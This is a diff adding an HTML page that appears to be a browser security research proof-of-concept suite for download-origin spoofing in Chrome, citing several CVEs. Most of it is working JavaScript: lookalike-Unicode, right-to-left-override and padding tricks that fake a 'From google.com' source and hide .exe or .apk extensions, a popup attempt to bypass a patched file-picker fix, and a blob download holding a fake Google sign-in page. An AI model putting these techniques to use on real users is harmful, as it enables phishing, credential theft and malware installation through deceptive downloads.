@@ -1,0 +1,423 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Download Origin Spoof — PoC Suite</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: system-ui, sans-serif; background: #0d1117; color: #e6edf3; padding: 30px; }
+h1 { color: #f0883e; font-size: 22px; margin-bottom: 6px; }
+.meta { color: #8b949e; font-size: 13px; margin-bottom: 28px; }
+.card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin: 16px 0; }
+h3 { color: #58a6ff; margin-bottom: 8px; font-size: 15px; }
+.cve { font-size: 11px; color: #8b949e; margin-bottom: 10px; }
+p { color: #8b949e; font-size: 13px; line-height: 1.5; margin-bottom: 12px; }
+pre { background: #0d1117; border: 1px solid #21262d; border-radius: 6px; padding: 12px;
+      font-size: 12px; color: #c9d1d9; overflow-x: auto; white-space: pre-wrap; margin-bottom: 12px; }
+.btn { display: inline-block; padding: 9px 18px; background: #238636; color: #fff;
+       border: none; border-radius: 6px; cursor: pointer; font-size: 13px; font-weight: 600;
+       margin-right: 8px; margin-top: 4px; }
+.btn:hover { background: #2ea043; }
+.btn.sec { background: #1f6feb; }
+.btn.sec:hover { background: #388bfd; }
+.btn.warn { background: #9e6a03; }
+.log { background: #0d1117; border-radius: 6px; padding: 10px 14px; margin-top: 12px;
+       font-family: monospace; font-size: 12px; min-height: 50px; color: #8b949e; }
+.ok  { color: #3fb950; }
+.err { color: #f85149; }
+.wrn { color: #e3b341; }
+.sev-high { float:right; background:#3d1f00; color:#f0883e; padding:2px 8px; border-radius:4px; font-size:11px; font-weight:700; }
+.sev-med  { float:right; background:#2d2000; color:#e3b341; padding:2px 8px; border-radius:4px; font-size:11px; font-weight:700; }
+.sev-low  { float:right; background:#1a2d1a; color:#3fb950; padding:2px 8px; border-radius:4px; font-size:11px; font-weight:700; }
+.tag { display:inline-block; padding:2px 8px; border-radius:20px; font-size:11px; font-weight:600;
+       background:#0d2044; color:#58a6ff; border:1px solid #1f6feb; margin-right:4px; }
+</style>
+</head>
+<body>
+
+<h1>📥 Download Origin Spoofing — PoC Suite</h1>
+<div class="meta">CVE-2024-2628 · CVE-2025-12908 · CVE-2026-3937 · CVE-2025-5065 · CVE-2025-11216</div>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!-- VARIANT 1: Unicode Character Substitution -->
+<!-- ════════════════════════════════════════════════════════════ -->
+<div class="card">
+  <span class="sev-high">HIGH</span>
+  <h3>Variant 1 — Unicode Colon/Slash Substitution</h3>
+  <div class="cve">CVE-2025-12908 (#421511847, $5K) · CVE-2026-3937 (#473118648, $3K) · x4...@gmail.com</div>
+  <div style="margin-bottom:8px">
+    <span class="tag">Desktop</span><span class="tag">Android</span>
+  </div>
+  <p>
+    Replace <code>:</code> with <code>∶</code> (U+2236 RATIO) and <code>/</code> with <code>⧸</code> (U+29F8 BIG SOLIDUS)
+    in the "From" field shown in Chrome's download bar. Android fix landed in CL 6701188 and CL 7476846.
+    <strong style="color:#f0883e">Desktop Chrome may still be vulnerable.</strong>
+  </p>
+  <pre>// Filename includes fake "From" attribution using lookalike Unicode chars
+// Chrome download bar shows: "importantdoc.pdf  From https://google.com"
+// But the actual download origin is attacker.com
+
+const variants = [
+  // V1a: Simple unicode colon+slash
+  'document.pdf     From https∶⧸⧸google.com',
+  // V1b: Long padding pushes real name off screen
+  'A'.repeat(80) + '.pdf  From https∶⧸⧸accounts.google.com',
+  // V1c: data: URL with unicode host
+  'data∶text/html⧸⧸accounts.google.com⧸login.html',
+];</pre>
+  <button class="btn" onclick="testUnicodeFilename()">▶ Test Unicode Filename</button>
+  <button class="btn sec" onclick="testAllVariants()">▶ All Variants</button>
+  <div class="log" id="log1">Ready...</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!-- VARIANT 2: Long Subdomain Elision -->
+<!-- ════════════════════════════════════════════════════════════ -->
+<div class="card">
+  <span class="sev-med">MEDIUM</span>
+  <h3>Variant 2 — Long Subdomain Truncation</h3>
+  <div class="cve">CVE-2024-2628 (#41487774, $3K) · lu...@gmail.com · FoundIn-120</div>
+  <div style="margin-bottom:8px">
+    <span class="tag">Desktop</span><span class="tag">Mobile</span>
+  </div>
+  <p>
+    Download bar shows truncated origin. Craft filename/URL so the visible portion looks like a trusted domain.
+    The full filename is: <code>file-from-accounts.google.com-⟨long padding⟩.attacker.com</code>
+  </p>
+  <pre>// The download bar elides the filename from the END — so put attacker domain at end
+// What user sees: "file-from-accounts.google.com..."
+// Real origin: attacker.com (shown only if user expands)
+
+const filename = 'file-from-accounts.google.com-verified-secure-2025-update-important' +
+                 'badgesecuritykeydownloadpackage.exe';</pre>
+  <button class="btn" onclick="testLongSubdomain()">▶ Test Subdomain Spoof</button>
+  <div class="log" id="log2">Ready...</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!-- VARIANT 3: showSaveFilePicker Cross-Origin (delayed) -->
+<!-- ════════════════════════════════════════════════════════════ -->
+<div class="card">
+  <span class="sev-med">MEDIUM</span>
+  <h3>Variant 3 — showSaveFilePicker() Delayed Cross-Origin</h3>
+  <div class="cve">CVE-2025-11216 (#419721056, $1K) · CVE-2025-5065 (#40059071, $2K)</div>
+  <div style="margin-bottom:8px">
+    <span class="tag">Desktop</span>
+  </div>
+  <p>
+    Click triggers <code>showSaveFilePicker()</code> with 3s delay. If user navigates to another origin
+    in that window, dialog appears there — implying trusted origin is requesting file save.
+    Fix (CL 5735618): "Consume user activation". <strong style="color:#f0883e">Popup variant may bypass this.</strong>
+  </p>
+  <pre>// Patched: showSaveFilePicker() in same tab after navigation — activation consumed
+// Potential bypass: transfer activation via window.open() popup
+document.addEventListener('click', () => {
+  // Option A (patched): setTimeout 3000ms in same tab
+  setTimeout(() => showSaveFilePicker({suggestedName: 'malicious.php'}), 3000);
+
+  // Option B (test): open popup that immediately calls showSaveFilePicker
+  // const popup = window.open('about:blank', '_blank', 'width=1,height=1');
+  // popup.showSaveFilePicker(...)  — does popup inherit activation?
+}, { once: true });</pre>
+  <button class="btn" onclick="testSavePickerSameTab()">▶ Test Same-Tab (patched ref)</button>
+  <button class="btn sec" onclick="testSavePickerPopup()">▶ Test Popup Bypass</button>
+  <div class="log" id="log3">Ready...</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!-- VARIANT 4: data: URL with fake host display -->
+<!-- ════════════════════════════════════════════════════════════ -->
+<div class="card">
+  <span class="sev-high">HIGH</span>
+  <h3>Variant 4 — data: URL Download with Hostname Injection</h3>
+  <div class="cve">CVE-2026-3937 (#473118648, $3K) — "Download origin spoofing using hostname in data uri"</div>
+  <div style="margin-bottom:8px">
+    <span class="tag">Android</span><span class="tag">Desktop test</span>
+  </div>
+  <p>
+    Use a <code>data:</code> URL as download href with a hostname-like structure embedded.
+    Android's download UI previously showed the "hostname" portion as the origin.
+    Desktop behavior may differ — test required.
+  </p>
+  <pre>// Craft data: URL that looks like it has a host:
+// data:application/octet-stream;base64,...  →  shown as "data:" only
+// But: data:text/html//accounts.google.com/... could fool older parsers
+
+const url = 'data:application/octet-stream;base64,' + btoa('malicious content');
+// Or with embedded fake host:
+const fakeHostUrl = 'data:text/html/accounts.google.com,' + encodeURIComponent('<h1>hi</h1>');</pre>
+  <button class="btn" onclick="testDataURL()">▶ Test data: Download</button>
+  <button class="btn sec" onclick="testDataURLFakeHost()">▶ Test Fake Host in data:</button>
+  <div class="log" id="log4">Ready...</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!-- VARIANT 5: blob: URL origin inheritance -->
+<!-- ════════════════════════════════════════════════════════════ -->
+<div class="card">
+  <span class="sev-med">MEDIUM</span>
+  <h3>Variant 5 — blob: URL Shows Parent Origin (XSS precondition)</h3>
+  <div class="cve">CVE-2016-5189 (Chrome) · Requires XSS on trusted domain to weaponize</div>
+  <div style="margin-bottom:8px">
+    <span class="tag">Desktop</span><span class="tag">Mobile</span>
+  </div>
+  <p>
+    <code>blob:</code> URL created on this page shows <em>this page's origin</em> in the download source.
+    In real attack: XSS on <code>accounts.google.com</code> → create blob → download shows google.com.
+    No fix needed — this is by-design but exploitable via XSS.
+  </p>
+  <pre>// This page's origin will appear as download source:
+const html = '&lt;h1&gt;Malicious content&lt;/h1&gt;';
+const blob = new Blob([html], { type: 'text/html' });
+const url = URL.createObjectURL(blob);
+// url = blob:https://this-origin.com/uuid
+// Download bar shows: "From this-origin.com"
+const a = document.createElement('a');
+a.href = url; a.download = 'google-security-update.html';
+a.click();</pre>
+  <button class="btn" onclick="testBlobOrigin()">▶ Test blob: Origin</button>
+  <div class="log" id="log5">Ready...</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!-- VARIANT 6: APK filename + long padding (mobile) -->
+<!-- ════════════════════════════════════════════════════════════ -->
+<div class="card">
+  <span class="sev-high">HIGH</span>
+  <h3>Variant 6 — APK Filename Spoof (Android)</h3>
+  <div class="cve">Based on the PoC from user — combines long padding + unicode + APK extension</div>
+  <div style="margin-bottom:8px">
+    <span class="tag">Android</span>
+  </div>
+  <p>
+    Long filename with underscores pushes "From https://google.com" to visible area while the actual
+    extension (.apk) and malicious part is hidden by truncation. Targets Android Chrome download notification.
+  </p>
+  <pre>const filename =
+  'importantbackupfilecontaininguserdataandsettingsforsystem' +
+  '.apk' +
+  '_'.repeat(60) +
+  'From https∶⧸⧸google.com';</pre>
+  <button class="btn" onclick="testAPKSpoof()">▶ Test APK Spoof</button>
+  <div class="log" id="log6">Ready...</div>
+</div>
+
+<!-- ════════════════════════════════════════════════════════════ -->
+<!-- RESULTS TABLE -->
+<!-- ════════════════════════════════════════════════════════════ -->
+<div class="card">
+  <h3>📊 Test Results Matrix</h3>
+  <table id="results-table" style="width:100%;border-collapse:collapse;font-size:12px;color:#8b949e;margin-top:8px">
+    <tr style="color:#58a6ff;border-bottom:1px solid #30363d">
+      <th style="text-align:left;padding:6px">Variant</th>
+      <th style="padding:6px">Chrome Desktop</th>
+      <th style="padding:6px">Firefox</th>
+      <th style="padding:6px">Edge</th>
+      <th style="padding:6px">Android</th>
+      <th style="padding:6px">Status</th>
+    </tr>
+    <tr id="row-v1"><td style="padding:6px">V1: Unicode ∶⧸</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">Untested</td></tr>
+    <tr id="row-v2"><td style="padding:6px">V2: Long Subdomain</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">Untested</td></tr>
+    <tr id="row-v3"><td style="padding:6px">V3: showSaveFilePicker</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">N/A</td><td style="padding:6px;text-align:center">Untested</td></tr>
+    <tr id="row-v4"><td style="padding:6px">V4: data: fake host</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">Untested</td></tr>
+    <tr id="row-v5"><td style="padding:6px">V5: blob: origin</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">Untested</td></tr>
+    <tr id="row-v6"><td style="padding:6px">V6: APK padding</td><td style="padding:6px;text-align:center">N/A</td><td style="padding:6px;text-align:center">N/A</td><td style="padding:6px;text-align:center">N/A</td><td style="padding:6px;text-align:center">—</td><td style="padding:6px;text-align:center">Untested</td></tr>
+  </table>
+</div>
+
+<script>
+function log(id, msg, cls) {
+  const el = document.getElementById('log' + id);
+  const span = document.createElement('span');
+  span.className = cls || '';
+  const now = new Date().toLocaleTimeString();
+  span.textContent = `[${now}] ${msg}`;
+  el.appendChild(span);
+  el.appendChild(document.createElement('br'));
+  el.scrollTop = el.scrollHeight;
+}
+
+function triggerDownload(url, filename, logId) {
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = filename;
+  a.style.display = 'none';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  log(logId, `Download triggered → filename: "${filename.substring(0, 80)}"`, 'ok');
+  log(logId, 'Check download bar: what origin/source is shown?', 'wrn');
+}
+
+// ── Variant 1: Unicode substitution ──────────────────────────────
+function testUnicodeFilename() {
+  const filename = 'google-security-update    From https∶⧸⧸accounts.google.com';
+  const content  = 'Malicious content — research PoC';
+  const blob     = new Blob([content], { type: 'application/octet-stream' });
+  const url      = URL.createObjectURL(blob);
+  log(1, 'Testing: "From https∶⧸⧸accounts.google.com" (unicode colon/slash)', 'ok');
+  log(1, 'U+2236 (∶) + U+29F8 (⧸) replacing : and /', null);
+  triggerDownload(url, filename, 1);
+}
+
+function testAllVariants() {
+  const content = 'PoC test content';
+  const blob    = new Blob([content], { type: 'application/octet-stream' });
+
+  const variants = [
+    // Unicode ratio + big solidus
+    'document.pdf     From https∶⧸⧸google.com',
+    // Zero-width space padding
+    'file.pdf​​​​​​​​​​From https://google.com',
+    // Right-to-left override at end
+    'document-‮gmoc.elgoog//:sptth morF.exe',
+    // Long underscore push
+    'legit-file.pdf' + '_'.repeat(60) + 'From-https-google.com',
+    // Fullwidth chars
+    'fiｌe.pdf（From https：／／google.com）',
+  ];
+
+  variants.forEach((fn, i) => {
+    const url = URL.createObjectURL(blob);
+    setTimeout(() => {
+      log(1, `Variant 1.${i+1}: "${fn.substring(0,50)}..."`, 'ok');
+      triggerDownload(url, fn, 1);
+    }, i * 500);
+  });
+}
+
+// ── Variant 2: Long subdomain ─────────────────────────────────────
+function testLongSubdomain() {
+  const filename = 'file-from-accounts.google.com-secure-verify-your-account-important-security-update-2025.exe';
+  const blob = new Blob(['PoC long subdomain'], { type: 'application/octet-stream' });
+  const url  = URL.createObjectURL(blob);
+  log(2, 'Filename starts with: "file-from-accounts.google.com..."', 'ok');
+  log(2, 'Real content: attacker-controlled. Download bar may truncate to show only the google.com part', 'wrn');
+  triggerDownload(url, filename, 2);
+}
+
+// ── Variant 3: showSaveFilePicker ─────────────────────────────────
+function testSavePickerSameTab() {
+  log(3, 'Waiting 3s — navigate to another site in this window NOW...', 'wrn');
+  log(3, '(Patched by CL 5735618 — user activation consumed)', null);
+  setTimeout(async () => {
+    try {
+      if (!('showSaveFilePicker' in window)) {
+        log(3, 'showSaveFilePicker not available in this browser', 'err');
+        return;
+      }
+      await window.showSaveFilePicker({
+        suggestedName: 'malicious.php',
+        types: [{ description: 'All Files', accept: { 'text/plain': ['.php'] } }],
+      });
+      log(3, '⚠ showSaveFilePicker appeared! Origin spoofing possible', 'ok');
+    } catch(e) {
+      log(3, 'showSaveFilePicker blocked: ' + e.message, 'err');
+      log(3, 'PATCHED — activation was consumed', null);
+    }
+  }, 3000);
+}
+
+function testSavePickerPopup() {
+  log(3, 'Testing popup bypass — opening minimal popup window...', 'ok');
+  const popup = window.open('', '_blank', 'width=1,height=1,left=0,top=0');
+  if (!popup) {
+    log(3, 'Popup blocked — enable popups for this origin', 'err');
+    return;
+  }
+  // Write a page that immediately calls showSaveFilePicker
+  popup.document.write(`<script>
+    (async () => {
+      try {
+        if (!('showSaveFilePicker' in window)) {
+          document.write('API not available');
+          return;
+        }
+        const h = await showSaveFilePicker({ suggestedName: 'malicious.php' });
+        document.write('⚠ SUCCESS — popup showed file picker!');
+        window.opener.postMessage('popup_success', '*');
+      } catch(e) {
+        document.write('Blocked: ' + e.message);
+        window.opener.postMessage('popup_blocked:' + e.message, '*');
+      }
+    })();
+  <\/script>`);
+  popup.document.close();
+
+  window.addEventListener('message', (e) => {
+    if (e.data === 'popup_success') {
+      log(3, '⚠ POPUP BYPASS WORKED — showSaveFilePicker in popup!', 'ok');
+    } else if (typeof e.data === 'string' && e.data.startsWith('popup_blocked:')) {
+      log(3, 'Popup blocked: ' + e.data.split(':')[1], 'err');
+    }
+  }, { once: true });
+  log(3, 'Popup opened — checking if showSaveFilePicker fires in popup context...', null);
+}
+
+// ── Variant 4: data: URL ──────────────────────────────────────────
+function testDataURL() {
+  const content = 'Malicious PoC content';
+  const b64     = btoa(content);
+  const url     = `data:application/octet-stream;base64,${b64}`;
+  log(4, 'Triggering download via data: URL', 'ok');
+  log(4, 'data: has no host — download bar should show "data:" or blank origin', null);
+  triggerDownload(url, 'google-security-patch.exe', 4);
+}
+
+function testDataURLFakeHost() {
+  // Attempt to embed a fake host path in the data: URL structure
+  // This was the CVE-2026-3937 pattern (Android): data:type/subtype//host/path
+  const variants = [
+    // Standard data: with misleading filename only
+    ['data:application/octet-stream,' + encodeURIComponent('poc'),
+     'security-update-from-google.exe'],
+    // Attempt path-like data: URL
+    ['data:text/html//accounts.google.com,' + encodeURIComponent('<h1>hi</h1>'),
+     'index.html'],
+  ];
+  variants.forEach(([url, fn], i) => {
+    setTimeout(() => {
+      log(4, `data: variant ${i+1}: URL starts with "${url.substring(0,50)}"`, 'ok');
+      triggerDownload(url, fn, 4);
+    }, i * 600);
+  });
+}
+
+// ── Variant 5: blob: origin ───────────────────────────────────────
+function testBlobOrigin() {
+  const html = `<!DOCTYPE html><html>
+<body style="font-family:Arial;text-align:center;padding:40px">
+  <h2>Security Alert</h2>
+  <p>Your session has expired. Please log in again.</p>
+  <input placeholder="Email" style="padding:8px;width:200px;display:block;margin:10px auto">
+  <input type="password" placeholder="Password" style="padding:8px;width:200px;display:block;margin:10px auto">
+  <button style="background:#1a73e8;color:white;border:none;padding:10px 20px;border-radius:4px">Sign in</button>
+  <p style="font-size:11px;color:red;margin-top:20px">PoC — blob: URL shows parent origin in download bar</p>
+</body></html>`;
+
+  const blob = new Blob([html], { type: 'text/html' });
+  const url  = URL.createObjectURL(blob);
+  log(5, `blob: URL created: ${url.substring(0, 60)}...`, 'ok');
+  log(5, `Origin that will appear in download bar: ${location.origin}`, 'wrn');
+  log(5, 'In real attack: XSS on accounts.google.com → blob shows google.com', null);
+  triggerDownload(url, 'google-session-restore.html', 5);
+}
+
+// ── Variant 6: APK spoof (user's original PoC) ───────────────────
+function testAPKSpoof() {
+  const filename =
+    'importantbackupfilecontaininguserdataandsettingsforsystem' +
+    '.apk' +
+    '_'.repeat(60) +
+    'From https∶⧸⧸google.com';
+
+  const blob = new Blob(['PoC APK spoof'], { type: 'application/octet-stream' });
+  const url  = URL.createObjectURL(blob);
+  log(6, 'APK filename with unicode "From https∶⧸⧸google.com" suffix', 'ok');
+  log(6, `Full filename length: ${filename.length} chars`, null);
+  log(6, 'On Android: notification truncates, may show "...From google.com"', 'wrn');
+  triggerDownload(url, filename, 6);
+}
+</script>
+</body>
+</html>
